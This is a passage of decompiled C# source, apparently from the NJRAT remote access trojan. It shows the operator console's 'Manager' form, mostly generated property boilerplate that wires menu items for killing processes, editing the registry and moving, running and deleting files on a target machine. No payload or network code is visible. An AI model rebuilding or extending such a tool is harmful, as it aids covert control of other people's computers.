using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using NJRAT.My;
using NJRAT.NJRAT;

namespace NJRAT
{
	// Token: 0x02000016 RID: 22
	[DesignerGenerated]
	public partial class Manager : Form
	{
		// Token: 0x0600030F RID: 783 RVA: 0x001616D8 File Offset: 0x0015FAD8
		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = Manager.__ENCList;
			lock (_ENCList)
			{
				bool flag = Manager.__ENCList.Count == Manager.__ENCList.Capacity;
				if (flag)
				{
					int num = 0;
					int num2 = 0;
					int num3 = Manager.__ENCList.Count - 1;
					int num4 = num2;
					for (;;)
					{
						int num5 = num4;
						int num6 = num3;
						if (num5 > num6)
						{
							break;
						}
						WeakReference weakReference = Manager.__ENCList[num4];
						flag = weakReference.IsAlive;
						if (flag)
						{
							bool flag2 = num4 != num;
							if (flag2)
							{
								Manager.__ENCList[num] = Manager.__ENCList[num4];
							}
							num++;
						}
						num4++;
					}
					Manager.__ENCList.RemoveRange(num, Manager.__ENCList.Count - num);
					Manager.__ENCList.Capacity = Manager.__ENCList.Count;
				}
				Manager.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}

		// Token: 0x1700011C RID: 284
		// (get) Token: 0x06000312 RID: 786 RVA: 0x001647B8 File Offset: 0x00162BB8
		// (set) Token: 0x06000313 RID: 787 RVA: 0x001647D0 File Offset: 0x00162BD0
		internal virtual StatusStrip StatusStrip1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._StatusStrip1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._StatusStrip1 = value;
			}
		}

		// Token: 0x1700011D RID: 285
		// (get) Token: 0x06000314 RID: 788 RVA: 0x001647DC File Offset: 0x00162BDC
		// (set) Token: 0x06000315 RID: 789 RVA: 0x001647F4 File Offset: 0x00162BF4
		internal virtual ToolStripStatusLabel SL
		{
			[DebuggerNonUserCode]
			get
			{
				return this._SL;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.SL_Click);
				bool flag = this._SL != null;
				if (flag)
				{
					this._SL.Click -= eventHandler;
				}
				this._SL = value;
				flag = this._SL != null;
				if (flag)
				{
					this._SL.Click += eventHandler;
				}
			}
		}

		// Token: 0x1700011E RID: 286
		// (get) Token: 0x06000316 RID: 790 RVA: 0x00164854 File Offset: 0x00162C54
		// (set) Token: 0x06000317 RID: 791 RVA: 0x0016486C File Offset: 0x00162C6C
		internal virtual ToolStripProgressBar pr
		{
			[DebuggerNonUserCode]
			get
			{
				return this._pr;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._pr = value;
			}
		}

		// Token: 0x1700011F RID: 287
		// (get) Token: 0x06000318 RID: 792 RVA: 0x00164878 File Offset: 0x00162C78
		// (set) Token: 0x06000319 RID: 793 RVA: 0x00164890 File Offset: 0x00162C90
		internal virtual ContextMenuStrip M1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._M1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._M1 = value;
			}
		}

		// Token: 0x17000120 RID: 288
		// (get) Token: 0x0600031A RID: 794 RVA: 0x0016489C File Offset: 0x00162C9C
		// (set) Token: 0x0600031B RID: 795 RVA: 0x001648B4 File Offset: 0x00162CB4
		internal virtual ToolStripMenuItem KillToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._KillToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.KillToolStripMenuItem1_Click);
				bool flag = this._KillToolStripMenuItem1 != null;
				if (flag)
				{
					this._KillToolStripMenuItem1.Click -= eventHandler;
				}
				this._KillToolStripMenuItem1 = value;
				flag = this._KillToolStripMenuItem1 != null;
				if (flag)
				{
					this._KillToolStripMenuItem1.Click += eventHandler;
				}
			}
		}

		// Token: 0x17000121 RID: 289
		// (get) Token: 0x0600031C RID: 796 RVA: 0x00164914 File Offset: 0x00162D14
		// (set) Token: 0x0600031D RID: 797 RVA: 0x0016492C File Offset: 0x00162D2C
		internal virtual ToolStripMenuItem KillDeleteToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._KillDeleteToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.KillDeleteToolStripMenuItem_Click);
				bool flag = this._KillDeleteToolStripMenuItem != null;
				if (flag)
				{
					this._KillDeleteToolStripMenuItem.Click -= eventHandler;
				}
				this._KillDeleteToolStripMenuItem = value;
				flag = this._KillDeleteToolStripMenuItem != null;
				if (flag)
				{
					this._KillDeleteToolStripMenuItem.Click += eventHandler;
				}
			}
		}

		// Token: 0x17000122 RID: 290
		// (get) Token: 0x0600031E RID: 798 RVA: 0x0016498C File Offset: 0x00162D8C
		// (set) Token: 0x0600031F RID: 799 RVA: 0x001649A4 File Offset: 0x00162DA4
		internal virtual ToolStripMenuItem RestartProcessToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RestartProcessToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.RestartProcessToolStripMenuItem_Click);
				bool flag = this._RestartProcessToolStripMenuItem != null;
				if (flag)
				{
					this._RestartProcessToolStripMenuItem.Click -= eventHandler;
				}
				this._RestartProcessToolStripMenuItem = value;
				flag = this._RestartProcessToolStripMenuItem != null;
				if (flag)
				{
					this._RestartProcessToolStripMenuItem.Click += eventHandler;
				}
			}
		}

		// Token: 0x17000123 RID: 291
		// (get) Token: 0x06000320 RID: 800 RVA: 0x00164A04 File Offset: 0x00162E04
		// (set) Token: 0x06000321 RID: 801 RVA: 0x00164A1C File Offset: 0x00162E1C
		internal virtual Timer vmethod_26
		{
			[DebuggerNonUserCode]
			get
			{
				return this._vmethod_26;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.vmethod_26_Tick);
				bool flag = this._vmethod_26 != null;
				if (flag)
				{
					this._vmethod_26.Tick -= eventHandler;
				}
				this._vmethod_26 = value;
				flag = this._vmethod_26 != null;
				if (flag)
				{
					this._vmethod_26.Tick += eventHandler;
				}
			}
		}

		// Token: 0x17000124 RID: 292
		// (get) Token: 0x06000322 RID: 802 RVA: 0x00164A7C File Offset: 0x00162E7C
		// (set) Token: 0x06000323 RID: 803 RVA: 0x00164A94 File Offset: 0x00162E94
		internal virtual ImageList ImageList1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ImageList1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ImageList1 = value;
			}
		}

		// Token: 0x17000125 RID: 293
		// (get) Token: 0x06000324 RID: 804 RVA: 0x00164AA0 File Offset: 0x00162EA0
		// (set) Token: 0x06000325 RID: 805 RVA: 0x00164AB8 File Offset: 0x00162EB8
		internal virtual ContextMenuStrip ContextMenuStrip1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ContextMenuStrip1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ContextMenuStrip1 = value;
			}
		}

		// Token: 0x17000126 RID: 294
		// (get) Token: 0x06000326 RID: 806 RVA: 0x00164AC4 File Offset: 0x00162EC4
		// (set) Token: 0x06000327 RID: 807 RVA: 0x00164ADC File Offset: 0x00162EDC
		internal virtual ToolStripMenuItem KillConnectionToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._KillConnectionToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.KillConnectionToolStripMenuItem_Click);
				bool flag = this._KillConnectionToolStripMenuItem != null;
				if (flag)
				{
					this._KillConnectionToolStripMenuItem.Click -= eventHandler;
				}
				this._KillConnectionToolStripMenuItem = value;
				flag = this._KillConnectionToolStripMenuItem != null;
				if (flag)
				{
					this._KillConnectionToolStripMenuItem.Click += eventHandler;
				}
			}
		}

		// Token: 0x17000127 RID: 295
		// (get) Token: 0x06000328 RID: 808 RVA: 0x00164B3C File Offset: 0x00162F3C
		// (set) Token: 0x06000329 RID: 809 RVA: 0x00164B54 File Offset: 0x00162F54
		internal virtual ContextMenuStrip crg
		{
			[DebuggerNonUserCode]
			get
			{
				return this._crg;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._crg = value;
			}
		}

		// Token: 0x17000128 RID: 296
		// (get) Token: 0x0600032A RID: 810 RVA: 0x00164B60 File Offset: 0x00162F60
		// (set) Token: 0x0600032B RID: 811 RVA: 0x00164B78 File Offset: 0x00162F78
		internal virtual ToolStripMenuItem RefreshToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RefreshToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.RefreshToolStripMenuItem_Click);
				bool flag = this._RefreshToolStripMenuItem != null;
				if (flag)
				{
					this._RefreshToolStripMenuItem.Click -= eventHandler;
				}
				this._RefreshToolStripMenuItem = value;
				flag = this._RefreshToolStripMenuItem != null;
				if (flag)
				{
					this._RefreshToolStripMenuItem.Click += eventHandler;
				}
			}
		}

		// Token: 0x17000129 RID: 297
		// (get) Token: 0x0600032C RID: 812 RVA: 0x00164BD8 File Offset: 0x00162FD8
		// (set) Token: 0x0600032D RID: 813 RVA: 0x00164BF0 File Offset: 0x00162FF0
		internal virtual ToolStripMenuItem EditToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._EditToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.EditToolStripMenuItem_Click);
				bool flag = this._EditToolStripMenuItem != null;
				if (flag)
				{
					this._EditToolStripMenuItem.Click -= eventHandler;
				}
				this._EditToolStripMenuItem = value;
				flag = this._EditToolStripMenuItem != null;
				if (flag)
				{
					this._EditToolStripMenuItem.Click += eventHandler;
				}
			}
		}

		// Token: 0x1700012A RID: 298
		// (get) Token: 0x0600032E RID: 814 RVA: 0x00164C50 File Offset: 0x00163050
		// (set) Token: 0x0600032F RID: 815 RVA: 0x00164C68 File Offset: 0x00163068
		internal virtual ToolStripMenuItem NewValueToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._NewValueToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.NewValueToolStripMenuItem_Click);
				bool flag = this._NewValueToolStripMenuItem != null;
				if (flag)
				{
					this._NewValueToolStripMenuItem.Click -= eventHandler;
				}
				this._NewValueToolStripMenuItem = value;
				flag = this._NewValueToolStripMenuItem != null;
				if (flag)
				{
					this._NewValueToolStripMenuItem.Click += eventHandler;
				}
			}
		}

		// Token: 0x1700012B RID: 299
		// (get) Token: 0x06000330 RID: 816 RVA: 0x00164CC8 File Offset: 0x001630C8
		// (set) Token: 0x06000331 RID: 817 RVA: 0x00164CE0 File Offset: 0x001630E0
		internal virtual ToolStripMenuItem DeleteToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._DeleteToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.DeleteToolStripMenuItem_Click);
				bool flag = this._DeleteToolStripMenuItem != null;
				if (flag)
				{
					this._DeleteToolStripMenuItem.Click -= eventHandler;
				}
				this._DeleteToolStripMenuItem = value;
				flag = this._DeleteToolStripMenuItem != null;
				if (flag)
				{
					this._DeleteToolStripMenuItem.Click += eventHandler;
				}
			}
		}

		// Token: 0x1700012C RID: 300
		// (get) Token: 0x06000332 RID: 818 RVA: 0x00164D40 File Offset: 0x00163140
		// (set) Token: 0x06000333 RID: 819 RVA: 0x00164D58 File Offset: 0x00163158
		internal virtual ImageList rimg
		{
			[DebuggerNonUserCode]
			get
			{
				return this._rimg;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._rimg = value;
			}
		}

		// Token: 0x1700012D RID: 301
		// (get) Token: 0x06000334 RID: 820 RVA: 0x00164D64 File Offset: 0x00163164
		// (set) Token: 0x06000335 RID: 821 RVA: 0x00164D7C File Offset: 0x0016317C
		internal virtual ContextMenuStrip crgk
		{
			[DebuggerNonUserCode]
			get
			{
				return this._crgk;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._crgk = value;
			}
		}

		// Token: 0x1700012E RID: 302
		// (get) Token: 0x06000336 RID: 822 RVA: 0x00164D88 File Offset: 0x00163188
		// (set) Token: 0x06000337 RID: 823 RVA: 0x00164DA0 File Offset: 0x001631A0
		internal virtual ToolStripMenuItem RefreshToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RefreshToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.RefreshToolStripMenuItem1_Click);
				bool flag = this._RefreshToolStripMenuItem1 != null;
				if (flag)
				{
					this._RefreshToolStripMenuItem1.Click -= eventHandler;
				}
				this._RefreshToolStripMenuItem1 = value;
				flag = this._RefreshToolStripMenuItem1 != null;
				if (flag)
				{
					this._RefreshToolStripMenuItem1.Click += eventHandler;
				}
			}
		}

		// Token: 0x1700012F RID: 303
		// (get) Token: 0x06000338 RID: 824 RVA: 0x00164E00 File Offset: 0x00163200
		// (set) Token: 0x06000339 RID: 825 RVA: 0x00164E18 File Offset: 0x00163218
		internal virtual ToolStripMenuItem CreateKeyToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CreateKeyToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.CreateKeyToolStripMenuItem_Click);
				bool flag = this._CreateKeyToolStripMenuItem != null;
				if (flag)
				{
					this._CreateKeyToolStripMenuItem.Click -= eventHandler;
				}
				this._CreateKeyToolStripMenuItem = value;
				flag = this._CreateKeyToolStripMenuItem != null;
				if (flag)
				{
					this._CreateKeyToolStripMenuItem.Click += eventHandler;
				}
			}
		}

		// Token: 0x17000130 RID: 304
		// (get) Token: 0x0600033A RID: 826 RVA: 0x00164E78 File Offset: 0x00163278
		// (set) Token: 0x0600033B RID: 827 RVA: 0x00164E90 File Offset: 0x00163290
		internal virtual ToolStripMenuItem DeleteSelectedToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._DeleteSelectedToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.DeleteSelectedToolStripMenuItem_Click);
				bool flag = this._DeleteSelectedToolStripMenuItem != null;
				if (flag)
				{
					this._DeleteSelectedToolStripMenuItem.Click -= eventHandler;
				}
				this._DeleteSelectedToolStripMenuItem = value;
				flag = this._DeleteSelectedToolStripMenuItem != null;
				if (flag)
				{
					this._DeleteSelectedToolStripMenuItem.Click += eventHandler;
				}
			}
		}

		// Token: 0x17000131 RID: 305
		// (get) Token: 0x0600033C RID: 828 RVA: 0x00164EF0 File Offset: 0x001632F0
		// (set) Token: 0x0600033D RID: 829 RVA: 0x00164F08 File Offset: 0x00163308
		internal virtual ContextMenuStrip ContextMenuStrip2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ContextMenuStrip2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ContextMenuStrip2 = value;
			}
		}

		// Token: 0x17000132 RID: 306
		// (get) Token: 0x0600033E RID: 830 RVA: 0x00164F14 File Offset: 0x00163314
		// (set) Token: 0x0600033F RID: 831 RVA: 0x00164F2C File Offset: 0x0016332C
		internal virtual ToolStripMenuItem StopToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._StopToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.StopToolStripMenuItem_Click);
				bool flag = this._StopToolStripMenuItem != null;
				if (flag)
				{
					this._StopToolStripMenuItem.Click -= eventHandler;
				}
				this._StopToolStripMenuItem = value;
				flag = this._StopToolStripMenuItem != null;
				if (flag)
				{
					this._StopToolStripMenuItem.Click += eventHandler;
				}
			}
		}

		// Token: 0x17000133 RID: 307
		// (get) Token: 0x06000340 RID: 832 RVA: 0x00164F8C File Offset: 0x0016338C
		// (set) Token: 0x06000341 RID: 833 RVA: 0x00164FA4 File Offset: 0x001633A4
		internal virtual ToolStripMenuItem PauseToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._PauseToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.PauseToolStripMenuItem_Click);
				bool flag = this._PauseToolStripMenuItem != null;
				if (flag)
				{
					this._PauseToolStripMenuItem.Click -= eventHandler;
				}
				this._PauseToolStripMenuItem = value;
				flag = this._PauseToolStripMenuItem != null;
				if (flag)
				{
					this._PauseToolStripMenuItem.Click += eventHandler;
				}
			}
		}

		// Token: 0x17000134 RID: 308
		// (get) Token: 0x06000342 RID: 834 RVA: 0x00165004 File Offset: 0x00163404
		// (set) Token: 0x06000343 RID: 835 RVA: 0x0016501C File Offset: 0x0016341C
		internal virtual ToolStripMenuItem StartToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._StartToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.StartToolStripMenuItem_Click);
				bool flag = this._StartToolStripMenuItem != null;
				if (flag)
				{
					this._StartToolStripMenuItem.Click -= eventHandler;
				}
				this._StartToolStripMenuItem = value;
				flag = this._StartToolStripMenuItem != null;
				if (flag)
				{
					this._StartToolStripMenuItem.Click += eventHandler;
				}
			}
		}

		// Token: 0x17000135 RID: 309
		// (get) Token: 0x06000344 RID: 836 RVA: 0x0016507C File Offset: 0x0016347C
		// (set) Token: 0x06000345 RID: 837 RVA: 0x00165094 File Offset: 0x00163494
		internal virtual ContextMenuStrip ContextMenuStrip3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ContextMenuStrip3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ContextMenuStrip3 = value;
			}
		}

		// Token: 0x17000136 RID: 310
		// (get) Token: 0x06000346 RID: 838 RVA: 0x001650A0 File Offset: 0x001634A0
		// (set) Token: 0x06000347 RID: 839 RVA: 0x001650B8 File Offset: 0x001634B8
		internal virtual ToolStripMenuItem UPToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._UPToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.UPToolStripMenuItem_Click);
				bool flag = this._UPToolStripMenuItem != null;
				if (flag)
				{
					this._UPToolStripMenuItem.Click -= eventHandler;
				}
				this._UPToolStripMenuItem = value;
				flag = this._UPToolStripMenuItem != null;
				if (flag)
				{
					this._UPToolStripMenuItem.Click += eventHandler;
				}
			}
		}

		// Token: 0x17000137 RID: 311
		// (get) Token: 0x06000348 RID: 840 RVA: 0x00165118 File Offset: 0x00163518
		// (set) Token: 0x06000349 RID: 841 RVA: 0x00165130 File Offset: 0x00163530
		internal virtual ToolStripMenuItem RefreshToolStripMenuItem2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RefreshToolStripMenuItem2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.RefreshToolStripMenuItem2_Click);
				bool flag = this._RefreshToolStripMenuItem2 != null;
				if (flag)
				{
					this._RefreshToolStripMenuItem2.Click -= eventHandler;
				}
				this._RefreshToolStripMenuItem2 = value;
				flag = this._RefreshToolStripMenuItem2 != null;
				if (flag)
				{
					this._RefreshToolStripMenuItem2.Click += eventHandler;
				}
			}
		}

		// Token: 0x17000138 RID: 312
		// (get) Token: 0x0600034A RID: 842 RVA: 0x00165190 File Offset: 0x00163590
		// (set) Token: 0x0600034B RID: 843 RVA: 0x001651A8 File Offset: 0x001635A8
		internal virtual ToolStripMenuItem RunToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RunToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.RunToolStripMenuItem_Click);
				bool flag = this._RunToolStripMenuItem != null;
				if (flag)
				{
					this._RunToolStripMenuItem.Click -= eventHandler;
				}
				this._RunToolStripMenuItem = value;
				flag = this._RunToolStripMenuItem != null;
				if (flag)
				{
					this._RunToolStripMenuItem.Click += eventHandler;
				}
			}
		}

		// Token: 0x17000139 RID: 313
		// (get) Token: 0x0600034C RID: 844 RVA: 0x00165208 File Offset: 0x00163608
		// (set) Token: 0x0600034D RID: 845 RVA: 0x00165220 File Offset: 0x00163620
		internal virtual ToolStripMenuItem Delete
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Delete;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.DeleteToolStripMenuItem1_Click);
				bool flag = this._Delete != null;
				if (flag)
				{
					this._Delete.Click -= eventHandler;
				}
				this._Delete = value;
				flag = this._Delete != null;
				if (flag)
				{
					this._Delete.Click += eventHandler;
				}
			}
		}

		// Token: 0x1700013A RID: 314
		// (get) Token: 0x0600034E RID: 846 RVA: 0x00165280 File Offset: 0x00163680
		// (set) Token: 0x0600034F RID: 847 RVA: 0x00165298 File Offset: 0x00163698
		internal virtual ToolStripMenuItem EditToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._EditToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.EditToolStripMenuItem1_Click);
				bool flag = this._EditToolStripMenuItem1 != null;
				if (flag)
				{
					this._EditToolStripMenuItem1.Click -= eventHandler;
				}
				this._EditToolStripMenuItem1 = value;
				flag = this._EditToolStripMenuItem1 != null;
				if (flag)
				{
					this._EditToolStripMenuItem1.Click += eventHandler;
				}
			}
		}

		// Token: 0x1700013B RID: 315
		// (get) Token: 0x06000350 RID: 848 RVA: 0x001652F8 File Offset: 0x001636F8
		// (set) Token: 0x06000351 RID: 849 RVA: 0x00165310 File Offset: 0x00163710
		internal virtual ToolStripMenuItem RenameToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RenameToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.RenameToolStripMenuItem_Click);
				bool flag = this._RenameToolStripMenuItem != null;
				if (flag)
				{
					this._RenameToolStripMenuItem.Click -= eventHandler;
				}
				this._RenameToolStripMenuItem = value;
				flag = this._RenameToolStripMenuItem != null;
				if (flag)
				{
					this._RenameToolStripMenuItem.Click += eventHandler;
				}
			}
		}

		// Token: 0x1700013C RID: 316
		// (get) Token: 0x06000352 RID: 850 RVA: 0x00165370 File Offset: 0x00163770
		// (set) Token: 0x06000353 RID: 851 RVA: 0x00165388 File Offset: 0x00163788
		internal virtual ToolStripMenuItem CopyToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CopyToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.CopyToolStripMenuItem_Click);
				bool flag = this._CopyToolStripMenuItem != null;
				if (flag)
				{
					this._CopyToolStripMenuItem.Click -= eventHandler;
				}
				this._CopyToolStripMenuItem = value;
				flag = this._CopyToolStripMenuItem != null;
				if (flag)
				{
					this._CopyToolStripMenuItem.Click += eventHandler;
				}
			}
		}

		// Token: 0x1700013D RID: 317
		// (get) Token: 0x06000354 RID: 852 RVA: 0x001653E8 File Offset: 0x001637E8
		// (set) Token: 0x06000355 RID: 853 RVA: 0x00165400 File Offset: 0x00163800
		internal virtual ToolStripMenuItem CutToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CutToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.CutToolStripMenuItem_Click);
				bool flag = this._CutToolStripMenuItem != null;
				if (flag)
				{
					this._CutToolStripMenuItem.Click -= eventHandler;
				}
				this._CutToolStripMenuItem = value;
				flag = this._CutToolStripMenuItem != null;
				if (flag)
				{
					this._CutToolStripMenuItem.Click += eventHandler;
				}
			}
		}

		// Token: 0x1700013E RID: 318
		// (get) Token: 0x06000356 RID: 854 RVA: 0x00165460 File Offset: 0x00163860
		// (set) Token: 0x06000357 RID: 855 RVA: 0x00165478 File Offset: 0x00163878
		internal virtual ToolStripMenuItem PasteToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._PasteToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.PasteToolStripMenuItem_Click);
				bool flag = this._PasteToolStripMenuItem != null;
				if (flag)
				{
					this._PasteToolStripMenuItem.Click -= eventHandler;
				}
				this._PasteToolStripMenuItem = value;
				flag = this._PasteToolStripMenuItem != null;
				if (flag)
				{
					this._PasteToolStripMenuItem.Click += eventHandler;
				}
			}
		}

		// Token: 0x1700013F RID: 319
		// (get) Token: 0x06000358 RID: 856 RVA: 0x001654D8 File Offset: 0x001638D8
		// (set) Token: 0x06000359 RID: 857 RVA: 0x001654F0 File Offset: 0x001638F0
		internal virtual ToolStripMenuItem DownloadToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._DownloadToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.DownloadToolStripMenuItem_Click);
				bool flag = this._DownloadToolStripMenuItem != null;
				if (flag)
				{
					this._DownloadToolStripMenuItem.Click -= eventHandler;
				}
				this._DownloadToolStripMenuItem = value;
				flag = this._DownloadToolStripMenuItem != null;
				if (flag)
				{
					this._DownloadToolStripMenuItem.Click += eventHandler;
				}
			}
		}

		// Token: 0x17000140 RID: 320
		// (get) Token: 0x0600035A RID: 858 RVA: 0x00165550 File Offset: 0x00163950
		// (set) Token: 0x0600035B RID: 859 RVA: 0x00165568 File Offset: 0x00163968
		internal virtual ToolStripMenuItem UploadToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._UploadToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.UploadToolStripMenuItem_Click);
				bool flag = this._UploadToolStripMenuItem != null;
				if (flag)
				{
					this._UploadToolStripMenuItem.Click -= eventHandler;
				}
				this._UploadToolStripMenuItem = value;
				flag = this._UploadToolStripMenuItem != null;
				if (flag)
				{
					this._UploadToolStripMenuItem.Click += eventHandler;
				}
			}
		}

		// Token: 0x17000141 RID: 321
		// (get) Token: 0x0600035C RID: 860 RVA: 0x001655C8 File Offset: 0x001639C8
		// (set) Token: 0x0600035D RID: 861 RVA: 0x001655E0 File Offset: 0x001639E0
		internal virtual ToolStripMenuItem NewEmptyFileToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._NewEmptyFileToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.NewEmptyFileToolStripMenuItem_Click);
				bool flag = this._NewEmptyFileToolStripMenuItem != null;
				if (flag)
				{
					this._NewEmptyFileToolStripMenuItem.Click -= eventHandler;
				}
				this._NewEmptyFileToolStripMenuItem = value;
				flag = this._NewEmptyFileToolStripMenuItem != null;
				if (flag)
				{
					this._NewEmptyFileToolStripMenuItem.Click += eventHandler;
				}
			}
		}

		// Token: 0x17000142 RID: 322
		// (get) Token: 0x0600035E RID: 862 RVA: 0x00165640 File Offset: 0x00163A40
		// (set) Token: 0x0600035F RID: 863 RVA: 0x00165658 File Offset: 0x00163A58
		internal virtual ToolStripMenuItem NewFolderToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._NewFolderToolStripMenuItem;
			}
			[DebuggerNonUserCode]
